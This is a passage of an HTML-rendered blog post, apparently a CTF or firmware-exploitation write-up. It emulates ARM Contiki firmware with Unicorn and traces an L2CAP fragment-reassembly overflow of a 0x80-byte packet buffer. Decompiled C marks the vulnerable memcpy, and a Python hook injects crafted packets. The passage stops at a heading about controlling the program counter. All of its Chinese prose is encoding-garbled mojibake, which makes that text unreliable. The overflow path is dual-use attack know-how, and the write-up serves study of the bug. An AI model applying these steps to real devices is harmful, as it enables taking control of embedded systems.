</span><span class="c1"></span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">bufsize</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088828</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">bufsize</span> <span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088828</span><span class="p">];</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
    <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x40088828</span><span class="p">];</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Â•ΩÔºåÊàë‰ª¨‰øÆÊîπ‰∏Ä‰∏ã <code>hook_mem_read</code> Êù•Ê®°ÊãüÁ°¨‰ª∂Ë°å‰∏∫ÔºåÈöè‰æøÂ°ûÁÇπ‰ªÄ‰πàÂà∞ MMIO„ÄÇÁÑ∂Âêé‰øÆÊîπ <code>hook_code</code> Âú® <code>input</code> ÂáΩÊï∞ÂºÄÂßãÊó∂È™åËØÅ‰∏Ä‰∏ãÊï∞ÊçÆÊúâÊ≤°ÊúâÊàêÂäüËæìÂÖ•„ÄÇÁªìÊûúÊòæÁ§∫ÊàêÂäü‰∫ÜÔºÅ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">data_ptr</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">data_len</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">hook_code</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">data_ptr</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DBA</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DBA: get_channel_for_cid, l2cap_channel_count &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">),</span> <span class="n">u8</span><span class="p">(</span><span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="mh">0x20002D76</span><span class="p">,</span> <span class="mi">1</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202D9C</span><span class="p">):</span>
        <span class="n">data_ptr</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202D9C: packetbuf_dataptr &#34;</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">)</span>
    <span class="k">elif</span> <span class="p">(</span><span class="n">address</span> <span class="o">==</span> <span class="mh">0x202DA2</span><span class="p">):</span>
        <span class="n">data_len</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">reg_read</span><span class="p">(</span><span class="n">UC_ARM_REG_R0</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x202DA2: packetbuf_datalen &#34;</span><span class="p">,</span> <span class="n">data_len</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;data: &#34;</span><span class="p">,</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span><span class="p">))</span>

<span class="n">packet_injected</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># memory pattern</span>
<span class="c1"># to inject a packget of p32(0x20) + &#39;a&#39;*0x20</span>
<span class="n">packet_body</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)]</span>
<span class="n">packet</span> <span class="o">=</span> <span class="p">[</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)]</span> <span class="o">+</span> <span class="n">packet_body</span>

<span class="k">def</span> <span class="nf">hook_mem_read</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">packet_injected</span><span class="p">,</span> <span class="n">packet</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_read] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">packet</span><span class="p">[</span><span class="n">packet_injected</span><span class="p">])</span>
            <span class="n">packet_injected</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">])</span>   <span class="c1"># to bypass sys_ctrl_init, random_init</span>
            <span class="c1"># print(f&#34;content: {mu.mem_read(address, 4)}, ready to write random: {r}&#34;)</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><p>ËøôÊ†∑Êàë‰ª¨ÊàêÂäüËµ∞Âà∞‰∫ÜÊºèÊ¥ûÂáΩÊï∞ÔºåÂπ∂‰∏îÊää <code>packetbuf</code> ÊàêÂäüËæìÂÖ•Êàê‰∫Ü 0x20 ‰∏™Â≠óÁ¨¶ a„ÄÇ</p>
<h6 id="Â¶Ç‰ΩïËß¶ÂèëÊºèÊ¥û">Â¶Ç‰ΩïËß¶ÂèëÊºèÊ¥û</h6>
<p>ÂèØ‰ª•ÁúãÂà∞ <code>process_thread_cc2538_rf_process</code> ‰∏≠‰ºöÂêë <code>packetbuf_dataptr</code> Â§ÑËØªÊúÄÂ§ö 0x80 Â≠óËäÇÔºåËÄåÂú® .bss ‰∏∫ÂÖ∂ÂàÜÈÖçÁöÑÁ©∫Èó¥Â∞±ÊòØ 0x80ÔºåÊöÇÊó∂‰πüÊ≤°‰ªÄ‰πàÂèëÁé∞‰ªÄ‰πàÈóÆÈ¢ò„ÄÇÈöèÁùÄÁêÜËß£‰ª£Á†ÅÁöÑÊ∑±ÂÖ•ÔºåÂèØ‰ª•ËÆ§‰∏∫ÁΩëÁªúÂåÖ‰∏ÄÊ¨°Âè™ËÉΩÊî∂ÊúÄÂ§ö 0x80 Â≠óËäÇÔºåÊØè‰∏Ä‰∏™ÁΩëÁªúÂåÖÁöÑÊï∞ÊçÆÈÉΩ‰ºöË¢´Êã∑Ë¥ùÂà∞ <code>packetbuf_dataptr</code> ‰∏≠„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="kr">__fastcall</span> <span class="nf">process_thread_cc2538_rf_process</span><span class="p">(</span><span class="n">pt</span> <span class="o">*</span><span class="n">process_pt</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>
  <span class="n">packetbuf_clear</span><span class="p">();</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">packetbuf_dataptr</span><span class="p">();</span>
  <span class="n">v7</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="mh">0x80u</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">packetbuf_set_datalen</span><span class="p">(</span><span class="n">v7</span><span class="p">);</span>
    <span class="n">input</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="p">...</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Ë¶ÅËß¶ÂèëÊºèÊ¥ûÔºåÊàë‰ª¨ÂøÖÈ°ªË¶ÅÂºÑÊ∏ÖÊ•ö channel ÊòØÂπ≤‰ªÄ‰πàÁöÑÔºåÂç≥Â¶Ç‰ΩïËÆ© <code>channel-&gt;rx_buffer.current_index</code> Ë∂ÖËøá 0x80 ÈÄ†ÊàêÊ∫¢Âá∫„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">input_l2cap_frame_flow_channel</span><span class="p">(</span><span class="n">l2cap_channel_t</span> <span class="o">*</span><span class="n">channel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">data_len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
    <span class="n">current_index</span> <span class="o">=</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">current_index</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v4</span> <span class="o">&gt;</span> <span class="mi">1280</span> <span class="o">-</span> <span class="n">current_index</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">curr_log_level_mac</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_5</span><span class="p">;</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu</span><span class="p">[</span><span class="n">current_index</span><span class="p">],</span> <span class="n">data</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">);</span>
    <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">current_index</span> <span class="o">+=</span> <span class="n">v4</span><span class="p">;</span>
<span class="nl">LABEL_10</span><span class="p">:</span>                                      
    <span class="k">if</span> <span class="p">(</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span> <span class="o">&amp;&amp;</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span> <span class="o">==</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">current_index</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="n">packetbuf_dataptr</span><span class="p">();</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">,</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span><span class="p">);</span> <span class="c1">//vuln
</span><span class="c1"></span>      <span class="p">...</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>   
</code></pre></td></tr></table>
</div>
</div><p>ËÄåËøô‰∏™ channel ÊòØÂú® <code>input</code> ‰∏≠ÈÄöËøá <code>get_channel_for_cid</code> ÂæóÂà∞ÁöÑÔºå‰º†ÁªôÂêéËÄÖÁöÑÂèÇÊï∞ÊòæÁÑ∂ÂèØÊéß„ÄÇÂè™ÈúÄË¶ÅËÆ© <code>channel_for_cid</code> ‰∏ç‰∏∫Èõ∂Â∞±ËÉΩËµ∞Âà∞ÊºèÊ¥ûÂàÜÊîØ„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">input</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">packetbuf_dataptr</span><span class="p">();</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">packetbuf_datalen</span><span class="p">();</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">packetbuf_attr_0</span><span class="p">(</span><span class="mh">0xBu</span><span class="p">);</span>
  <span class="p">...</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="n">channel_for_cid</span> <span class="o">=</span> <span class="n">get_channel_for_cid</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
  <span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">5</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">input_l2cap_frame_signal_channel</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span> <span class="c1">// return
</span><span class="c1"></span>  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">channel_for_cid</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">input_l2cap_frame_flow_channel</span><span class="p">(</span><span class="n">channel_for_cid</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span><span class="c1">// vul
</span><span class="c1"></span>    <span class="p">...</span>
    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span> <span class="c1">// return
</span><span class="c1"></span>  <span class="p">}</span>

<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>‰ª£Á†ÅÈÄªËæëÂç≥Â∞ÜÊµÆÂá∫Ê∞¥Èù¢ÔºåÂÜçÊù•Áúã <code>get_channel_for_cid</code>ÔºåÊü•Áúã l2cap_channel_count ÁöÑ‰∫§ÂèâÂºïÁî®ÂèëÁé∞Âú® <code>input_l2cap_conn_req</code> ‰∏≠ÊîπÂèòÔºåËÄå‰∏ä‰∏™‰ª£Á†ÅÊÆµ‰∏≠ <code>input_l2cap_frame_signal_channel</code> ÊÅ∞Â•Ω‰ºöË∞ÉÁî®Ê≠§ÂáΩÊï∞„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">l2cap_channel_t</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">get_channel_for_cid</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">own_cid</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// r0
</span><span class="c1"></span>
  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int16</span><span class="p">)(</span><span class="n">own_cid</span> <span class="o">-</span> <span class="mh">0x41</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="n">l2cap_channel_count</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="o">&amp;</span><span class="n">l2cap_channels</span><span class="p">[</span><span class="n">v1</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ÈÇ£‰πàÁúã‰∏äÂéªÊàë‰ª¨ÂæóÂÖàËøõ <code>input_l2cap_frame_signal_channel</code> Êù•Â¢ûÂä† channel</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">input_l2cap_frame_signal_channel</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">data_len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// r3
</span><span class="c1"></span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="k">switch</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">case</span> <span class="mi">20</span><span class="o">:</span>
      <span class="n">input_l2cap_conn_req</span><span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">...</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Â¢ûÂä†ÂÆå channel ÂêéÊàë‰ª¨Â∞±ËÉΩÊàêÂäüËøõÂÖ•ÊºèÊ¥ûÂáΩÊï∞ <code>input_l2cap_frame_flow_channel</code> ‰∫Ü„ÄÇËøô‰∏™ÂáΩÊï∞Â§ßÊ¶ÇÈÄªËæëÊòØÔºöÁª¥Êä§‰∏Ä‰∏™ÊØî 0x80 bytes ÁöÑÊõ¥Â§ßÔºà0x504 bytesÔºâÁöÑÁºìÂÜ≤Âå∫ÔºåÂ¶ÇÊûúÁΩëÁªúÂåÖ‰∏çÂàÜÁâáÔºàÂç≥Âè™Êúâ‰∏Ä‰∏™ÁΩëÁªúÂåÖÔºåÂÖ∂ÊÄªÂ§ßÂ∞èÂüü‰∏éÂΩìÂâçÁâáÂ§ßÂ∞èÂüüÁõ∏ÂêåÔºâÔºåÂàôÊääÂÜÖÂÆπÊã∑Ë¥ùÂà∞ÁºìÂÜ≤Âå∫Â§¥ÈÉ®ÔºõÂ¶ÇÊûúÁΩëÁªúÂåÖÂàÜÁâáÔºåÂàôÂêéÁª≠Êé•Êî∂Êñ∞ÁöÑÁΩëÁªúÂåÖ‰ºöÊääÂÜÖÂÆπ‰∏çÊñ≠Êé•Âú®ÂêéÈù¢ÔºåÂÆûÁé∞ÊãºÊé•ÔºõÊúÄÁªàÁõ¥Âà∞Êé•Êî∂Âà∞ÁöÑÂ§ßÂ∞è‰∏éÁ¨¨‰∏Ä‰∏™ÁΩëÁªúÂåÖÊÄªÂ§ßÂ∞èÂüüÁöÑÂÄºÁõ∏ÂêåÔºå‰∏ÄÊ¨°ÊÄßÂú∞ÊääËøô‰∏™Â§ßÁºìÂÜ≤Âå∫ÁöÑÂÜÖÂÆπÊã∑Ë¥ùÂõû <code>packetbuf_dataptr</code>„ÄÇËÄåÊàë‰ª¨Áü•ÈÅì <code>packetbuf_dataptr</code> Âè™Êúâ 0x80 bytes Â§ßÂ∞èÔºåÈÇ£‰πàÂ§öÊûÑÈÄ†Âá†‰∏™ÂàÜÁâáÂåÖÂ∞±ËÉΩËΩªÊòìÂÆûÁé∞Ê∫¢Âá∫„ÄÇ</p>
<p>ÊâÄ‰ª•ÊÄªÁöÑÊù•ËØ¥Êàë‰ª¨Ë¶ÅËøô‰πàÂÅöÔºö</p>
<ol>
<li>
<p>Ëß¶Âèë 158 Âè∑‰∏≠Êñ≠ÔºåÂπ∂Á≤æÂøÉÊûÑÈÄ†ÁΩëÁªúÂåÖ‰ΩøÂÖ∂ËøõÂÖ• <code>input</code> ÁöÑ <code>input_l2cap_frame_signal_channel</code> ÂàÜÊîØ„ÄÇ</p>
</li>
<li>
<p>Â§öÊ¨°Ëß¶Âèë 158 Âè∑‰∏≠Êñ≠ÔºåÂπ∂Á≤æÂøÉÊûÑÈÄ†ÁΩëÁªúÂåÖ‰ΩøÂÖ∂ËøõÂÖ• <code>input</code> ÁöÑ <code>input_l2cap_frame_flow_channel</code> ÂàÜÊîØÔºåÊúÄÁªàËß¶ÂèëË∂äÁïåÊã∑Ë¥ù„ÄÇ</p>
</li>
</ol>
<p>Ë¶ÅËøô‰πàÂÅöÂ∞±ÈúÄË¶ÅÂ§öÊ¨°Ê≥®ÂÖ•‰∏≠Êñ≠Ôºå‰∏çÁ¶Å‰∏∫ÂâçÈù¢‰ΩøÁî®ÁöÑÈ£éÈõ®È£òÊëáÁ†¥ÁÉÇ‰∏çÂ†™ÁöÑ‰∏≠Êñ≠Ê≥®ÂÖ•‰ª£Á†ÅÊçè‰∫ÜÊääÊ±óÔºà‰ΩÜ‰∫ãÂÆû‰∏äÂ•ΩÂÉèÊ≤°Âá∫Â§™Â§öÈóÆÈ¢òÔºâ„ÄÇÁî±‰∫é Unicorn Áñë‰ºº‰∏çÊîØÊåÅ WFI Êåá‰ª§ÔºåÊâÄ‰ª•ÈúÄË¶ÅÊää 0x210768 Â§ÑÁöÑ‰ª£Á†Å patch ÊéâÔºå‰ΩøÂÖ∂ËÉΩÊ®°Êãü‰∏ªÂáΩÊï∞‰∏≠ÁöÑÂæ™ÁéØ„ÄÇ</p>
<blockquote>
<p>WFI Êåá‰ª§‰ºöÂ∞ÜÁ≥ªÁªü‰ºëÁú†ÔºåÂè™ÊúâË¢´‰∏≠Êñ≠ÊâçËÉΩÂî§ÈÜíÂêéÂπ∂ÁªßÁª≠ÊâßË°åÔºåËøôÊ†∑Âú®ÂÆûÈôÖÁéØÂ¢É‰∏≠ËÉΩÂ§ßÂ§ßÂáèÂ∞ëËÉΩÈáèÊ∂àËÄóÔºåÂπ∂Âú®‰∏ÄÂÆöÁ®ãÂ∫¶‰∏äÂÆûÁé∞‰∫ÜÂìçÂ∫îÂºèÂ§ÑÁêÜËØ∑Ê±ÇÁöÑÂú∫ÊôØÔºåÁÆÄÁõ¥Â§™Êô∫ÊÖß‰∫Ü„ÄÇ</p>
</blockquote>
<h6 id="ÊéßÂà∂-pc">ÊéßÂà∂ PC</h6>
